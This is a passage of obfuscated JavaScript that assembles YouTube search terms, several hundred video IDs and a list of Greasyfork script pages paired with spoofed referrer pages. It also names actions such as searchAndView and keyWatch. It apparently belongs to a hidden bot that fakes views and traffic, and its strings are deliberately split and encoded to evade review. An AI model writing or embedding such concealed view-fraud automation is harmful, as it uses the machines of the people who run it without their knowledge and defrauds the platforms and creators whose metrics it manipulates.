searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x11d1 + -0x9a9 + 0x6 * 0x496)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x52c + 0xfb0 + -0xa69 * 0x2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x6 * 0x109 + 0x4d2 * 0x3 + -0x14a9);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    Z(0x18) + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    a0(0x1) + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    Z(0x1f) + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    X(0x1c, '*QO^') + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    X(0x12, '&EZQ') + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    X(0x1e, '1f(w') + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    Z(0x19) + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    a0(0x4) + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + Z(0x2),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': X(0x1d, 'a77Z') + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + X(0x3, 'Q7iQ') + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Z(0x14) + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + a0(0x1b) + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
